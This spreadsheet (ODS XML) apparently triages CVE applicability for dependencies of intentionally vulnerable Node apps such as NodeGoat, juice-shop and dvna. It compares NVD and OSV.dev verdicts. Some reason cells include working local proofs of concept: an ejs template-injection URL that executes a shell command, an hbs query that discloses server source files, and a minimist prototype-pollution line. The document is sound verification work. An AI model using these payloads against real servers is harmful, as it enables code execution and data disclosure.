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quot;" svg:font-family="&quot;Arial&quot;"/>
    <style:font-face style:name="&quot;Liberation Sans&quot;" svg:font-family="'&quot;Liberation Sans&quot;'"/>
    <style:font-face style:name="Arial" svg:font-family="Arial"/>
    <style:font-face style:name="Cambria" svg:font-family="Cambria"/>
    <style:font-face style:name="Liberation Serif" svg:font-family="'Liberation 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90.31pt"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="593.8pt"/>
    </style:style>
    <style:style style:name="co4" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="553.4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4">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8pt" fo:font-style="normal" fo:text-shadow="none" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="8pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="&quot;Arial&quot;" style:font-size-complex="8pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="ce4" style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:background-color="#81d41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 style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:background-color="#81d41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name-complex="Liberation Serif" style:font-size-complex="8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quot;Liberation Sans&quot;" fo:font-size="8pt" fo:font-style="normal" fo:text-shadow="none" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-size-asian="8pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="&quot;Liberation Sans&quot;" style:font-size-complex="8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quot;Liberation Sans&quot;" fo:font-size="8pt" fo:font-style="normal" fo:text-shadow="none" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-size-asian="8pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-name-complex="&quot;Liberation Sans&quot;" style:font-size-complex="8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4" table:style-name="ta1">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <table:table-column table:style-name="co1" table:number-columns-repeated="2"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1" table:number-columns-repeated="17" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co4" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:number-columns-repeated="999" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="27"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2"/>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Project</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Conflict</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Dependency</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Winner</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Result</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Reason</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>NodeGoat</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>Async:0.2.9</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>NodeGoat</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Async:1.5.2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>NodeGoat</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>Async:0.9.2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>NodeGoat</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>Async:0.2.10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable-node</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-29078</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>ejs:2.7.4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://eslam.io/posts/ejs-server-side-template-injection-rce/" xlink:type="simple">The NVD claims that only version 3.1.6 of ejs is vulnerable whereas the OSV.dev claims versions 0 up to 3.1.7 (excluding) are vulnerable.

PoC: https://eslam.io/posts/ejs-server-side-template-injection-rce/. 

Install express@3.0.0 and ejs@2.7.4 via npm.

Create index.js and copy the PoC code into it. 

const express = require('express')
const app = express()
const port = 4000

app.set('view engine', 'ejs');

app.get('/page', (req,res) =&gt; {
    res.render('page', req.query);
})

app.listen(port, () =&gt; {
  console.log(`Example app listening on port ${port}`)
})

Create a views folder and put the ejs template inside a file page.ejs inside the views folder.

&lt;h1&gt; You are viewing page number &lt;%= id %&gt;&lt;/h1&gt;

Start the server, visit this link: http://localhost:4000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s    

Then in your /tmp folder a file pwned will appear.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable-node</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-29078</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ejs:0.8.8 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://eslam.io/posts/ejs-server-side-template-injection-rce/" xlink:type="simple">The NVD claims that only version 3.1.6 of ejs is vulnerable whereas the OSV.dev claims versions 0 up to 3.1.7 (excluding) are vulnerable.

The vulnerable function still exists and therefore this version is still affected. https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf#diff-18aff90313b014fc8148e052d4a3602eae9b81ae10c49d6f301fa61b14bffdbd</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-36313</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>file-type:5.2.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv" xlink:type="simple">The API was completely re-written in version 13.0.0 and this introduced the vulnerability. Version 5.2.0, which is installed is not vulnerable as NVD claims.

Download the following file: https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv

Install version 5.2.0 of file-type via npm. 
Then create a file called test.js. 
Put the following contents within it:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');
const buffer = fs.readFileSync(filePath);
fileType(buffer);

console.log("will finish")

Run the file using “node test.js” and the program will execute and terminate.

Next install 13.0.0 of file-type via npm.

Remove the file test.js and create a new one with the following contents:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');

fileType.fromFile(filePath);
console.log("will never finish");

Run the file using “node test.js” and the program will never finish.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="13"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2020-15366</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ajv:6.12.6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/ajv-validator/ajv/commit/988982d3fde08e3ea074e8942442834e78c45587" xlink:type="simple">https://github.com/ajv-validator/ajv/commit/988982d3fde08e3ea074e8942442834e78c45587

The fix introduced in the commit above, changes code that existed like that since version 0.0.0 of ajv. NVD claims that only version 6.12.2 is vulnerable, which is wrong. 

See here version 0.5.0, which contains the flaw: https://github.com/ajv-validator/ajv/blob/5f36f17f63219bcceed2f2f1bf3e758eebe23444/lib/dot/dependencies.jst</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="2"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-36313</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>file-type:11.1.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv" xlink:type="simple">The API was completely re-written in version 13.0.0 and this introduced the vulnerability. Version 11.1.0, which is installed is not vulnerable as NVD claims.

Download the following file: https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv

Install version 11.1.0 of file-type via npm. 
Then create a file called test.js. 
Put the following contents within it:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');
const buffer = fs.readFileSync(filePath);
fileType(buffer);

console.log("will finish")

Run the file using “node test.js” and the program will execute and terminate.

Next install 13.0.0 of file-type via npm.

Remove the file test.js and create a new one with the following contents:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');

fileType.fromFile(filePath);
console.log("will never finish");

Run the file using “node test.js” and the program will never finish.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2020-7598</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>minimist:0.2.1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>The NVD claims all versions below 1.2.2 are vulnerable. </text:p>
            <text:p/>
            <text:p>The installed version of minimist is however not vulnerable. (0.2.1)</text:p>
            <text:p/>
            <text:p>Install version 0.2.1 of minimist using npm and run the following line: </text:p>
            <text:p/>
            <text:p>require('minimist')('--__proto__.injected0 value0'.split(' ')); console.log(({}).injected0 === 'value0'); // true </text:p>
            <text:p/>
            <text:p>This will print false to the console because the prototype pollution did not work.</text:p>
            <text:p/>
            <text:p>Install version 0.2.0 of minimist using npm and run the line again, now it will say true, because versions 0.0.0 - 0.2.0 (including) are vulnerable and 1.0.0 up to 1.2.2 (including)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-32822</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>hbs:4.2.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>NVD</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://localhost:4000/?settings" xlink:type="simple">NVD claims that all versions of the package are vulnerable and OSV.dev claims the installed version is not vulnerable 0.0.0  - 4.1.2 (including) is vulnerable according to the OSV.dev. 
 
Install express 3.21.2 and hbs 4.1.2 via npm

Create a file test.js and put the following contents inside 
 
const express = require('express')
const app = express()
const port = 4000
app.set('views', __dirname);
app.set('view engine', 'hbs');
app.use(express.urlencoded({ extended: false }));
app.get('/', (req, res) =&gt; {
   res.render('index', req.query)
})
 
app.listen(port, () =&gt; { })
module.exports = app;
 
Create a file called index.hbs in the folder and put the word hi or anything else inside.
 
Start the server: node test.js
 
Open a browser and visit: http://localhost:4000/?settings[views]=.&amp;settings[view%20options][layout])=test.js
 
And you will recieve the source code of the test.js file
 
Install hbs 4.2.0 (i.e. the installed version of hbs)
 
Restart the server and open a browser and visit: http://localhost:4000/?settings[views]=.&amp;settings[view%20options][layout])=test.js
 
You again receive the source code of the test.js file. Thus NVD is correct.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-36313</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>file-type:6.2.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv" xlink:type="simple">The API was completely re-written in version 13.0.0 and this introduced the vulnerability. Version 6.2.0, which is installed is not vulnerable as NVD claims.

Download the following file: https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv

Install version 6.2.0 of file-type via npm. 
Then create a file called test.js. 
Put the following contents within it:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');
const buffer = fs.readFileSync(filePath);
fileType(buffer);

console.log("will finish")

Run the file using “node test.js” and the program will execute and terminate.

Next install 13.0.0 of file-type via npm.

Remove the file test.js and create a new one with the following contents:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');

fileType.fromFile(filePath);
console.log("will never finish");

Run the file using “node test.js” and the program will never finish.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2020-7792</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>mout:1.2.3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/mout/mout/commit/3fecf1333e6d71ae72edf48c71dc665e40df7605" xlink:type="simple">NVD claims that all versions of mout are affected, while the OSV.dev defines that versions equal or above to 1.2.3 are patched.


Commit: https://github.com/mout/mout/commit/3fecf1333e6d71ae72edf48c71dc665e40df7605 fixes the vulnerability at version 1.2.3, thus the OSV.dev is correct.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-36313</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>file-type:4.4.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv" xlink:type="simple">The API was completely re-written in version 13.0.0 and this introduced the vulnerability. Version 4.4.0, which is installed is not vulnerable as NVD claims.

Download the following file: https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv

Install version 4.4.0 of file-type via npm. 
Then create a file called test.js. 
Put the following contents within it:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');
const buffer = fs.readFileSync(filePath);
fileType(buffer);

console.log("will finish")

Run the file using “node test.js” and the program will execute and terminate.

Next install 13.0.0 of file-type via npm.

Remove the file test.js and create a new one with the following contents:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');

fileType.fromFile(filePath);
console.log("will never finish");

Run the file using “node test.js” and the program will never finish.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-36313</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>file-type:3.9.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv" xlink:type="simple">The API was completely re-written in version 13.0.0 and this introduced the vulnerability. Version 3.9.0, which is installed is not vulnerable as NVD claims.

Download the following file: https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv

Install version 3.9.0 of file-type via npm. 
Then create a file called test.js. 
Put the following contents within it:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');
const buffer = fs.readFileSync(filePath);
fileType(buffer);

console.log("will finish")

Run the file using “node test.js” and the program will execute and terminate.

Next install 13.0.0 of file-type via npm.

Remove the file test.js and create a new one with the following contents:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');

fileType.fromFile(filePath);
console.log("will never finish");

Run the file using “node test.js” and the program will never finish.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>juice-shop</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-0355</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>simple-get:3.1.1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/feross/simple-get/blob/496166d2fff21b4ec1d4ab9e7c8d4b2ab11ebf18/index.js" xlink:type="simple">The NVD claims that all versions below 4.0.1 (excluding) are vulnerable, however OSV.dev claims that the installed version 3.1.1 is not vulnerable.

The patch: https://github.com/feross/simple-get/commit/e4af095e06cd69a9235013e8507e220a79b9684f

Exists within version 3.1.1, therefore it is not vulnerable: https://github.com/feross/simple-get/blob/496166d2fff21b4ec1d4ab9e7c8d4b2ab11ebf18/index.js</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>dvna</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-29078</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ejs:2.7.4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>The NVD claims that only version 3.1.6 of ejs is vulnerable whereas the OSV.dev claims versions 0 up to 3.1.7 (excluding) are vulnerable.</text:p>
            <text:p/>
            <text:p>PoC: https://eslam.io/posts/ejs-server-side-template-injection-rce/. </text:p>
            <text:p/>
            <text:p>Install express@3.0.0 and ejs@2.7.4 via npm.</text:p>
            <text:p/>
            <text:p>Create index.js and copy the PoC code into it. </text:p>
            <text:p/>
            <text:p>const express = require('express')</text:p>
            <text:p>const app = express()</text:p>
            <text:p>const port = 4000</text:p>
            <text:p/>
            <text:p>app.set('view engine', 'ejs');</text:p>
            <text:p/>
            <text:p>app.get('/page', (req,res) =&gt; {</text:p>
            <text:p>    res.render('page', req.query);</text:p>
            <text:p>})</text:p>
            <text:p/>
            <text:p>app.listen(port, () =&gt; {</text:p>
            <text:p>  console.log(`Example app listening on port ${port}`)</text:p>
            <text:p>})</text:p>
            <text:p/>
            <text:p>Create a views folder and put the ejs template inside a file page.ejs inside the views folder.</text:p>
